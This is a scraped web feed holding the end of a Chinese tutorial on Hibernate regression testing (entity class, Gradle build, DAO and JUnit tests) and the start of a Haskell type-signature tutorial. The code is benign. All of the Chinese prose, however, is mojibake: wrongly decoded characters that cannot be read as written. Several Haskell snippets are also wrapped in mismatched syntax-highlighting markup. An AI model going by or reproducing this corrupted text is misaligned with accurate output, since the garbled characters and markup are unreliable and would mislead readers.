    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. åˆ›å»ºå®ä½“ç±»</h3>
<p>å®šä¹‰ä¸€ä¸ªç®€å•çš„å®ä½“ç±»æ¥è¡¨ç¤ºæ•°æ®åº“è¡¨ä¸­çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-4"><code>User.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String email;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-5">3. é…ç½®Gradle</h3>
<p>åœ¨Gradleæ„å»ºè„šæœ¬ä¸­æ·»åŠ Hibernateå’ŒJUnitä¾èµ–ã€‚</p>
<h4 data-id="heading-6"><code>build.gradle</code></h4>
<pre><code class="hljs language-groovy" lang="groovy">plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.hibernate:hibernate-core:5.6.5.Final'
    implementation 'mysql:mysql-connector-java:8.0.27'
    testImplementation 'org.junit.jupiter:junit-jupiter:5.8.2'
}

test {
    useJUnitPlatform()
}
</code></pre>
<h3 data-id="heading-7">4. ç¼–å†™æ•°æ®è®¿é—®å¯¹è±¡ï¼ˆDAOï¼‰</h3>
<p>ç¼–å†™ä¸€ä¸ªæ•°æ®è®¿é—®å¯¹è±¡ç±»ï¼Œç”¨äºæ‰§è¡Œæ•°æ®åº“æ“ä½œã€‚</p>
<h4 data-id="heading-8"><code>UserDAO.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDAO</span> {
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDAO</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        sessionFactory = config.buildSessionFactory();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        session.save(user);
        transaction.commit();
        session.close();
    }

    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.get(User.class, id);
        session.close();
        <span class="hljs-keyword">return</span> user;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        session.update(user);
        transaction.commit();
        session.close();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        session.delete(user);
        transaction.commit();
        session.close();
    }

    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findAllUsers</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        List&lt;User&gt; users = session.createQuery(<span class="hljs-string">"FROM User"</span>, User.class).list();
        session.close();
        <span class="hljs-keyword">return</span> users;
    }
}
</code></pre>
<h3 data-id="heading-9">5. ç¼–å†™å›å½’æµ‹è¯•è„šæœ¬</h3>
<p>ä½¿ç”¨JUnitç¼–å†™å›å½’æµ‹è¯•è„šæœ¬ï¼ŒéªŒè¯æ’å…¥ã€æ›´æ–°ã€åˆ é™¤ç­‰æ“ä½œã€‚</p>
<h4 data-id="heading-10"><code>UserDAOTest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.*;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.jupiter.api.Assertions.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDAOTest</span> {
    <span class="hljs-keyword">private</span> UserDAO userDAO;

    <span class="hljs-meta">@BeforeEach</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUp</span><span class="hljs-params">()</span> {
        userDAO = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDAO</span>();
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSaveAndGetUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"John Doe"</span>);
        user.setEmail(<span class="hljs-string">"john.doe@example.com"</span>);
        userDAO.saveUser(user);

        <span class="hljs-type">User</span> <span class="hljs-variable">retrievedUser</span> <span class="hljs-operator">=</span> userDAO.getUserById(user.getId());
        assertNotNull(retrievedUser);
        assertEquals(<span class="hljs-string">"John Doe"</span>, retrievedUser.getName());
        assertEquals(<span class="hljs-string">"john.doe@example.com"</span>, retrievedUser.getEmail());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUpdateUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"Jane Doe"</span>);
        user.setEmail(<span class="hljs-string">"jane.doe@example.com"</span>);
        userDAO.saveUser(user);

        user.setName(<span class="hljs-string">"Jane Smith"</span>);
        userDAO.updateUser(user);

        <span class="hljs-type">User</span> <span class="hljs-variable">updatedUser</span> <span class="hljs-operator">=</span> userDAO.getUserById(user.getId());
        assertEquals(<span class="hljs-string">"Jane Smith"</span>, updatedUser.getName());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDeleteUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"Mark Doe"</span>);
        user.setEmail(<span class="hljs-string">"mark.doe@example.com"</span>);
        userDAO.saveUser(user);

        userDAO.deleteUser(user);
        <span class="hljs-type">User</span> <span class="hljs-variable">deletedUser</span> <span class="hljs-operator">=</span> userDAO.getUserById(user.getId());
        assertNull(deletedUser);
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFindAllUsers</span><span class="hljs-params">()</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user1.setName(<span class="hljs-string">"User1"</span>);
        user1.setEmail(<span class="hljs-string">"user1@example.com"</span>);
        userDAO.saveUser(user1);

        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user2.setName(<span class="hljs-string">"User2"</span>);
        user2.setEmail(<span class="hljs-string">"user2@example.com"</span>);
        userDAO.saveUser(user2);

        List&lt;User&gt; users = userDAO.findAllUsers();
        assertTrue(users.size() &gt;= <span class="hljs-number">2</span>);
    }
}
</code></pre>
<h3 data-id="heading-11">ä¾‹å­è§£é‡Š</h3>
<ol>
<li><strong>Hibernateé…ç½®ï¼š</strong> é…ç½®ä¸€ä¸ªHibernateé…ç½®æ–‡ä»¶ï¼Œç”¨äºè¿æ¥æ•°æ®åº“ã€‚</li>
<li><strong>å®ä½“ç±»ï¼š</strong> åˆ›å»ºä¸€ä¸ªç®€å•çš„å®ä½“ç±»æ¥è¡¨ç¤ºæ•°æ®åº“è¡¨ä¸­çš„æ•°æ®ã€‚</li>
<li><strong>Gradleé…ç½®ï¼š</strong> åœ¨Gradleæ„å»ºè„šæœ¬ä¸­æ·»åŠ Hibernateå’ŒJUnitä¾èµ–ã€‚</li>
<li><strong>æ•°æ®è®¿é—®å¯¹è±¡ï¼ˆDAOï¼‰ï¼š</strong> ç¼–å†™ä¸€ä¸ªæ•°æ®è®¿é—®å¯¹è±¡ç±»ï¼Œç”¨äºæ‰§è¡Œæ•°æ®åº“æ“ä½œã€‚åŒ…æ‹¬ä¿å­˜ã€è·å–ã€æ›´æ–°ã€åˆ é™¤å’ŒæŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·çš„æ–¹æ³•ã€‚</li>
<li><strong>å›å½’æµ‹è¯•è„šæœ¬ï¼š</strong> ä½¿ç”¨JUnitç¼–å†™å›å½’æµ‹è¯•è„šæœ¬ï¼ŒéªŒè¯å„ç§æ•°æ®åº“æ“ä½œçš„æ­£ç¡®æ€§ã€‚æµ‹è¯•è„šæœ¬åŒ…æ‹¬ï¼š
<ul>
<li>ä¿å­˜å’Œè·å–ç”¨æˆ·ï¼šéªŒè¯æ’å…¥æ“ä½œå’Œé€šè¿‡IDè·å–ç”¨æˆ·çš„æ­£ç¡®æ€§ã€‚</li>
<li>æ›´æ–°ç”¨æˆ·ï¼šéªŒè¯æ›´æ–°æ“ä½œçš„æ­£ç¡®æ€§ã€‚</li>
<li>åˆ é™¤ç”¨æˆ·ï¼šéªŒè¯åˆ é™¤æ“ä½œçš„æ­£ç¡®æ€§ã€‚</li>
<li>æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ï¼šéªŒè¯æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·çš„æ­£ç¡®æ€§ã€‚</li>
</ul>
</li>
</ol>
<p>é€šè¿‡ä»¥ä¸Šé…ç½®å’Œä»£ç ç¤ºä¾‹ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•åœ¨æ•°æ®åº“å›å½’æµ‹è¯•ä¸­ä½¿ç”¨Hibernateã€‚è¿™åŒ…æ‹¬é…ç½®Hibernateã€å®šä¹‰å®ä½“ç±»ã€ç¼–å†™æ•°æ®è®¿é—®å¯¹è±¡ã€ç¼–å†™å›å½’æµ‹è¯•è„šæœ¬ï¼Œä»¥åŠä½¿ç”¨JUnitè¿è¡Œæµ‹è¯•ã€‚æ­¤æµç¨‹å¸®åŠ©ç¡®ä¿æ•°æ®åº“çš„æ›´æ”¹ä¸ä¼šç ´åç°æœ‰åŠŸèƒ½ï¼Œä¿è¯ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå¯é æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - ç±»å‹ç­¾å]]></title>    <link>https://juejin.cn/post/7604690250343399474</link>    <guid>https://juejin.cn/post/7604690250343399474</guid>    <pubDate>2026-02-09T08:17:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604690250343399474" data-draft-id="7604080364354879515" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - ç±»å‹ç­¾å"/> <meta itemprop="keywords" content="åç«¯,Haskell"/> <meta itemprop="datePublished" content="2026-02-09T08:17:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - ç±»å‹ç­¾å
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:17:33.000Z" title="Mon Feb 09 2026 08:17:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç±»å‹ç­¾åæ˜¯Haskellç¨‹åºå‘˜ä¸ç¼–è¯‘å™¨æ²Ÿé€šçš„æ ¸å¿ƒæ¥å£ï¼Œå…¶è®¾è®¡å…¼é¡¾<strong>ä¸¥è°¨æ€§</strong>ä¸<strong>ç®€æ´æ€§</strong>ã€‚æœ¬ç« èšç„¦æ ¸å¿ƒè¯­æ³•çš„è®¾è®¡é€»è¾‘ï¼Œè§£æå…¶èƒŒåçš„ç±»å‹ç†è®ºä¸å·¥ç¨‹ä»·å€¼ã€‚</p>
<h2 data-id="heading-0">1.1 ç±»å‹æ ‡æ³¨ç¬¦ <code>::</code> çš„è®¾è®¡é€»è¾‘</h2>
<p><code>::</code>ï¼ˆè¯»ä½œâ€œhas typeâ€ï¼‰æ˜¯è¿æ¥ç¨‹åºå‘˜æ„å›¾ä¸ç¼–è¯‘å™¨æ ¡éªŒçš„æ¡¥æ¢ï¼Œæ ¸å¿ƒè®¾è®¡ç›®æ ‡æ˜¯<strong>æ˜¾å¼çº¦æŸ</strong>ä¸<strong>é”™è¯¯æ‹¦æˆª</strong>ã€‚</p>
<h3 data-id="heading-1">1.1.1 æ ¸å¿ƒä½œç”¨ï¼šå£°æ˜å³å¥‘çº¦</h3>
<p><code>::</code> ä¸ºæ ‡è¯†ç¬¦ï¼ˆå˜é‡/å‡½æ•°/è¡¨è¾¾å¼ï¼‰ç»‘å®šä¸€ä¸ªæ˜ç¡®çš„ç±»å‹å¥‘çº¦ã€‚ç¼–è¯‘å™¨ä¼šä¸¥æ ¼å¯¹æ¯”â€œæ ‡æ³¨ç±»å‹â€ä¸â€œæ¨å¯¼ç±»å‹â€ï¼Œä¸€æ—¦å†²çªç«‹å³æŠ¥é”™ï¼Œæ— ä»»ä½•éšå¼è½¬æ¢ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">age :: Int
<span class="hljs-attr">age</span> = <span class="hljs-number">20</span> -- å¥‘çº¦è¾¾æˆï¼Œç¼–è¯‘é€šè¿‡

-- <span class="hljs-attr">age</span> = <span class="hljs-string">"20"</span> -- å¥‘çº¦è¿çº¦ï¼Œç¼–è¯‘æŠ¥é”™
</code></pre>
<h3 data-id="heading-2">1.1.2 ä¸‰å¤§åº”ç”¨åœºæ™¯</h3>
<ol>
<li>
<p><strong>å˜é‡æ ‡æ³¨</strong>ï¼šæ¶ˆé™¤æ•°å€¼ç±»å‹æ­§ä¹‰ï¼ˆå¦‚ <code>Int</code> ä¸ <code>Integer</code>ï¼‰ï¼Œæå‡å¯è¯»æ€§ã€‚</p>
<ol>
<li>
<pre><code class="hljs language-ini" lang="ini">score :: Double
<span class="hljs-attr">score</span> = <span class="hljs-number">95.5</span>
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>å‡½æ•°æ ‡æ³¨</strong>ï¼šä½œä¸ºâ€œç±»å‹å³æ–‡æ¡£â€çš„æ¥å£è¯´æ˜ï¼Œå£°æ˜è¾“å…¥è¾“å‡ºçº¦æŸã€‚</p>
<ol>
<li>
<pre><code class="hljs language-ini" lang="ini">add :: Num <span class="hljs-attr">a</span> =&gt; a -&gt; a -&gt; a
add x <span class="hljs-attr">y</span> = x + y
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>è¡¨è¾¾å¼æ ‡æ³¨</strong>ï¼šè§£å†³å±€éƒ¨ç±»å‹æ¨æ–­æ­§ä¹‰ï¼Œä¸ºå¤æ‚è¡¨è¾¾å¼æä¾›é”šç‚¹ã€‚</p>
<ol>
<li>
<pre><code class="hljs language-arduino" lang="arduino">-- æ˜ç¡®æŒ‡å®š read çš„ç›®æ ‡ç±»å‹ä¸º Int
num = read <span class="hljs-string">"123"</span> :: Int
</code></pre>
</li>
</ol>
</li>
</ol>
<h3 data-id="heading-3">1.1.3 ä¸ç±»å‹æ¨æ–­çš„ååŒ</h3>
<p>Haskelléµå¾ª**â€œæ¨æ–­ä¼˜å…ˆï¼Œæ ‡æ³¨è¡¥å……â€<strong>åŸåˆ™ã€‚</strong> <strong><code>::</code></strong> <strong>å¹¶éé‡å¤åŠ³åŠ¨ï¼Œè€Œæ˜¯ä½œä¸º</strong>çº¦æŸæ¡ä»¶**å­˜åœ¨ï¼š</p>
<ul>
<li>è‹¥æ— æ ‡æ³¨ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨æ¨å¯¼æœ€é€šç”¨ç±»å‹ï¼›</li>
<li>è‹¥æœ‰æ ‡æ³¨ï¼Œç¼–è¯‘å™¨éªŒè¯æ¨å¯¼ç»“æœæ˜¯å¦å…¼å®¹è¯¥æ ‡æ³¨ï¼ˆå…è®¸ç‰¹åŒ–ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-4">1.2 å‡½æ•°ç±»å‹çš„æ ¸å¿ƒï¼š<code>-&gt;</code> çš„å³ç»“åˆä¸æŸ¯é‡ŒåŒ–</h2>
<p><code>-&gt;</code> æ˜¯å‡½æ•°ç±»å‹çš„æ ¸å¿ƒæ ‡è¯†ï¼Œå…¶<strong>å³ç»“åˆ</strong>è®¾è®¡æ˜¯Haskellå‡½æ•°æ¨¡å‹çš„åŸºçŸ³ï¼Œå®Œå…¨æœåŠ¡äº**æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰**ç‰¹æ€§ã€‚</p>
<h3 data-id="heading-5">1.2.1 è®¾è®¡æœ¬è´¨ï¼šå•å‚æ•°å‡½æ•°çš„åµŒå¥—</h3>
<p>Haskellä¸­<strong>æ‰€æœ‰å‡½æ•°æœ¬è´¨ä¸Šéƒ½æ˜¯å•å‚æ•°</strong>çš„ã€‚<code>a -&gt; b -&gt; c</code> å¹¶éæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œè€Œæ˜¯æ¥æ”¶ <code>a</code> å¹¶è¿”å›ä¸€ä¸ªæ¥æ”¶ <code>b</code> è¿”å› <code>c</code> çš„æ–°å‡½æ•°ã€‚å³ç»“åˆè§„åˆ™ <code>a -&gt; (b -&gt; c)</code> å®Œç¾è¡¨è¾¾äº†è¿™ä¸€ç‚¹ã€‚</p>
<h3 data-id="heading-6">1.2.2 æŸ¯é‡ŒåŒ–ä¸éƒ¨åˆ†åº”ç”¨</h3>
<p>è¯¥è®¾è®¡å¤©ç„¶æ”¯æŒ<strong>éƒ¨åˆ†åº”ç”¨</strong>ï¼Œè®©å‡½æ•°è°ƒç”¨æ›´çµæ´»ï¼Œæ— éœ€ä¸“é—¨çš„å¤šå‚æ•°ç±»å‹è¯­æ³•ã€‚</p>
<pre><code class="hljs language-rust" lang="rust">-- ç±»å‹ï¼šInt <span class="hljs-punctuation">-&gt;</span> (<span class="hljs-type">String</span> <span class="hljs-punctuation">-&gt;</span> Bool)
checkLength :: Int <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> <span class="hljs-punctuation">-&gt;</span> Bool
checkLength n s = length s &gt; n

-- éƒ¨åˆ†åº”ç”¨ï¼šä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°å‡½æ•°
check5 :: <span class="hljs-type">String</span> <span class="hljs-punctuation">-&gt;</span> Bool
check5 = checkLength <span class="hljs-number">5</span> -- å¤ç”¨ check5 é€»è¾‘
</code></pre>
<h3 data-id="heading-7">1.2.3 è°ƒç”¨çš„ä¸€è‡´æ€§</h3>
<p>æ— è®ºæ˜¯å¸¸è§„è°ƒç”¨ <code>f a b</code> è¿˜æ˜¯åˆ†æ­¥è°ƒç”¨ <code>(f a) b</code>ï¼Œåœ¨ç±»å‹å±‚é¢å®Œå…¨ä¸€è‡´ï¼Œå‡éµå¾ªå³ç»“åˆè§£æé€»è¾‘ã€‚</p>
<h2 data-id="heading-8">1.3 å¤šå‚æ•°å‡½æ•°ç±»å‹çš„è®¾è®¡é€»è¾‘</h2>
<p>åŸºäº <code>-&gt;</code> çš„å³ç»“åˆç‰¹æ€§ï¼Œå¤šå‚æ•°å‡½æ•°ç±»å‹éµå¾ªç®€å•ç›´è§‚çš„è§„åˆ™ã€‚</p>
<h3 data-id="heading-9">1.3.1 é»„é‡‘è§„åˆ™</h3>
<p><strong>nä¸ªå‚æ•°å¯¹åº”nä¸ª</strong> <strong><code>-&gt;</code></strong> <strong>ï¼Œæœ€å³ä¾§ä¸ºè¿”å›ç±»å‹</strong>ã€‚</p>
<ul>
<li><code>a -&gt; b -&gt; c</code>ï¼šåŒå‚æ•°ï¼Œè¿”å› <code>c</code>ã€‚</li>
<li><code>a -&gt; b -&gt; c -&gt; d</code>ï¼šä¸‰å‚æ•°ï¼Œè¿”å› <code>d</code>ã€‚</li>
</ul>
<h3 data-id="heading-10">1.3.2 å¸¦çº¦æŸçš„å¤šå‚æ•°</h3>
<p>åœ¨ç±»å‹å‰æ·»åŠ  <code>ç±»å‹ç±»çº¦æŸ =&gt;</code>ï¼Œé™åˆ¶å‚æ•°ç±»å‹éœ€å®ç°ç‰¹å®šè¡Œä¸ºï¼ˆå¦‚ <code>Num</code>ã€<code>Eq</code>ï¼‰ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">--</span> çº¦æŸ <span class="hljs-selector-tag">a</span> å¿…é¡»æ˜¯æ•°å€¼ç±»å‹
<span class="hljs-selector-tag">sumTwo</span> :: <span class="hljs-selector-tag">Num</span> <span class="hljs-selector-tag">a</span> =&gt; <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">sumTwo</span> <span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">y</span> = <span class="hljs-selector-tag">x</span> + <span class="hljs-selector-tag">y</span>
